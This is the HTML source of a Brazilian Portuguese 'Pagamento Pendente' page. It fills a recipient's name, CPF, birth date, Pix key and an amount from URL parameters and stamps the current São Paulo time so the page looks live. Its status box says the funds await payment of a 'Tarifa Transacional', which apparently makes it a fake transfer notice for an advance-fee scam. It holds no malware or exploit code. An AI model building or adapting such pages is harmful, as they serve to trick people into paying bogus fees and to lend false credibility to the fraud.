<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link href="https://fonts.cdnfonts.com/css/rawline" rel="stylesheet">            
    <title>Pagamento Pendente</title>
    <style>
        body {
            font-family: 'Rawline', sans-serif;
            margin: 0;
            padding: 0;
            background-color: #eaeaea;
        }

        .container {
            max-width: 100%;
            height: auto;
            padding: 0;
            background-color: #D6468E;
            overflow: hidden;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1); 
        }

        .header {
            background-image: url('https://s3.typebot.io/public/workspaces/clpwrgv88001vlh0fl3wduaqz/typebots/clsoykmoc0001o1a8fuuy3j8r/blocks/z8nhply1ap7tgvjamkhx6gbt?v=1709692314467');
            background-size: cover;
            background-repeat: no-repeat;
            background-size: 100%;
            color: white;
            padding: 10% 5%;
            border-radius: 10px;
        }

        .value-date-container {
            background-color: #fff;
            border-radius: 8px;
            padding: 5% 5% 3%;
            margin: -5% 5% 3%;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
            display: flex;
            justify-content: space-between;
            align-items: center;
            flex-wrap: wrap;
        }

        .value-date {
            text-align: left;
            width: 48%;
            margin-bottom: 5%;
        }

        .value-date label {
            font-size: 4vw; /* Tamanho de fonte responsivo */
            color: #666;
            font-weight: bold;
        }

        .value-date p {
            font-size: 5vw; /* Tamanho de fonte responsivo */
            color: #D6468E;
            font-weight: 800;
            margin: 2% 0;
        }

        .status-alert {
            background-color: #f7f7f7;
            color: #333;
            text-align: left;
            padding: 5%;
            font-weight: bold;
            border-radius: 4px;
            margin: 5%;
            display: flex;
            align-items: center;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
        }

        .status-alert img {
            height: 10vw;
            margin-right: 5%;
        }

        .status-text {
            color: #ff635f;
            font-size: 4vw;
            font-weight: bold;
            margin-bottom: 2%;
        }

        .receiver-info {
            padding: 5%;
            background-color: #f7f7f7;
            border-radius: 4px;
            margin: 5%;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
        }

        .receiver-info h2 {
            font-size: 4vw;
            color: #333;
            margin-bottom: 5%;
            font-weight: bold;
        }

        .receiver-info label {
            font-size: 3vw;
            color: #666;
            font-weight: bold;
            display: block;
            margin-bottom: 2%;
        }

        .receiver-info p {
            font-size: 4vw;
            color: #333;
            margin: 2% 0;
            font-weight: bold;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header"></div>
        <div class="value-date-container">
            <div class="value-date">
                <label>Valor</label>
                <p id="ticket">{{ticket}}</p>
            </div>
            <div class="value-date">
                <label>Data</label>
                <p><span>05/04/2024</span><br><span>17:07:56</span></p>
            </div>
        </div>
        <div class="status-alert">
            <img src="https://s3.typebot.io/public/workspaces/clpwrgv88001vlh0fl3wduaqz/typebots/clsoykmoc0001o1a8fuuy3j8r/blocks/x6j1c4cd706xk4eqprrumdcp?v=1709150901064" alt="Erro">
            <div class="status-text">
                <strong>Liberação pendente!</strong><br>
                Aguardando Pagamento da Tarifa Transacional.
            </div>
        </div>
        <div class="receiver-info">
            <h2>Dados do Recebedor:</h2>
            <label>Nome</label>
            <p id="nome">{{nome}}</p>
            <label>CPF</label>
            <p id="cpf">{{cpf}}</p>
            <label>Data de Nascimento</label>
            <p id="nasc">{{nascimento}}</p>
            <label>Chave Pix:</label>
            <p id="pix">{{pix}}</p>
        </div>
    </div>
    <script>
        // Função para obter os parâmetros da URL
        function getQueryParams() {
            var params = {};
            var parser = document.createElement('a');
            parser.href = window.location.href;
            var query = parser.search.substring(1);
            var vars = query.split('&');
            for (var i = 0; i < vars.length; i++) {
                var pair = vars[i].split('=');
                params[pair[0]] = decodeURIComponent(pair[1]);
            }
            return params;
        }
    
        // Função para atualizar a data e a hora
        function updateDateTime() {
            var now = new Date();
            var options = {
                day: '2-digit', 
                month: '2-digit', 
                year: 'numeric', 
                hour: '2-digit', 
                minute: '2-digit', 
                second: '2-digit', 
                hour12: false, 
                timeZone: 'America/Sao_Paulo'
            };
            var dateTimeString = now.toLocaleString('pt-BR', options).replace(',', ''); // Remove a vírgula
            var [date, time] = dateTimeString.split(' ');
            document.querySelector('.value-date span:first-child').textContent = date.trim(); // Remove espaços em branco extras
            document.querySelector('.value-date span:last-child').textContent = time;
        }
    
        // Configura os parâmetros da URL nos campos
        window.onload = function() {
            var queryParams = getQueryParams();
            if (queryParams.nome) {
                document.getElementById('nome').textContent = queryParams.nome;
            }
            if (queryParams.cpf) {
                document.getElementById('cpf').textContent = queryParams.cpf;
            }
            if (queryParams.nasc) {
                document.getElementById('nasc').textContent = queryParams.nasc;
            }
            if (queryParams.pix) {
                document.getElementById('pix').textContent = queryParams.pix;
            }
            if (queryParams.ticket) {
                document.getElementById('ticket').textContent = queryParams.ticket;
            }
            // Atualiza a data e a hora ao carregar a página
            updateDateTime();
        };
    </script>
</body>
</html>
